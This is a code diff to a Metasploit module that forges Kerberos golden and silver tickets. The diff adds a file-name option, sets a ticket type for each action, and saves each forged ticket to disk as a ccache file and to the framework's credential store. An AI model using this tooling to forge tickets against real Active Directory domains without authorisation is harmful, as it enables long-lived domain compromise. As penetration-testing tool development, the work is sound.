@@ -47,7 +47,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
         OptString.new('DOMAIN_SID', [ true, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962']),
         OptString.new('SPN', [ false, 'The Service Principal Name (Only used for silver ticket)'], regex: %r{.*/.*}),
-        OptInt.new('DURATION', [ false, 'Duration of the ticket in days', 3650])
+        OptInt.new('DURATION', [ false, 'Duration of the ticket in days', 3650]),
+        OptString.new('FILENAME', [ false, 'The file name', nil]),
       ]
     )
     deregister_options('RHOSTS', 'RPORT', 'Timeout')
@@ -74,18 +75,22 @@ class MetasploitModule < Msf::Auxiliary
     start_time = Time.now
     end_time = start_time + SECS_IN_DAY * datastore['DURATION']
 
+    ticket_type = nil
+
     case action.name
     when 'FORGE_SILVER'
       fail_with(Msf::Exploit::Failure::BadConfig, 'SPN must be set for forging a silver ticket') if datastore['SPN'].blank?
       sname = datastore['SPN'].split('/', 2)
       flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(silver_ticket_flags)
+      ticket_type = :tgs
     when 'FORGE_GOLDEN'
       sname = ['krbtgt', datastore['DOMAIN'].upcase]
       flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(golden_ticket_flags)
+      ticket_type = :tgt
     else
       fail_with(Msf::Module::Failure::BadConfig, "Invalid action #{action.name}")
     end
-    create_ticket(
+    ccache = forge_ticket(
       enc_key: enc_key,
       enc_type: enc_type,
       start_time: start_time,
@@ -97,6 +102,29 @@ class MetasploitModule < Msf::Auxiliary
       user_id: datastore['USER_RID'],
       domain_sid: datastore['DOMAIN_SID']
     )
+
+    fname = datastore['FILENAME']
+    fname ||= "#{[datastore['USER'], (datastore['SPN'] || datastore['DOMAIN']).gsub(/[^\w]/, '_')].join('_')}.ccache"
+    path = store_local('mit.kerberos.ccache', 'application/octet-stream', ccache.encode, fname)
+
+    credential_krb_tgs_data = {
+      workspace_id: myworkspace_id,
+      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+      realm_value: datastore['DOMAIN'],
+      module_fullname: framework_module.fullname,
+      origin_type: :import,
+      filename: fname,
+      username: datastore['USER'],
+      private_type: :krb_ticket,
+      private_data: create_krb_ticket_data(
+        type: ticket_type,
+        ccache: ccache,
+        sname: datastore['SPN']
+      )
+    }
+
+    framework_module.create_credential(credential_krb_tgs_data)
+    print_good("MIT Credential Cache ticket saved on #{path}")
   end
 
   private
@@ -115,5 +143,23 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['AES_KEY'].present? && (datastore['AES_KEY'].size != 32 && datastore['AES_KEY'].size != 64)
       fail_with(Msf::Exploit::Failure::BadConfig, "AES key length was #{datastore['AES_KEY'].size} should be 32 or 64")
     end
+  end
+
+  # @option [Symbol] :type Either tgt or tgs
+  # @option [Rex::Proto::Kerberos::Model::PrincipalName,String] :sname The target service principal name.
+  # @param [Rex::Proto::Kerberos::CredentialCache::Krb5Ccache] ccache
+  # @return [Hash]
+  def create_krb_ticket_data(type:, ccache:, sname: nil)
+    # at this time Metasploit stores 1 credential per ccache file, so no need to iterate through them
+    cred = ccache.credentials.first
+
+    {
+      type: type,
+      sname: sname.to_s,
+      value: ccache.encode,
+      authtime: cred.authtime.to_time,
+      starttime: cred.starttime.to_time,
+      endtime: cred.endtime.to_time
+    }
   end
 end
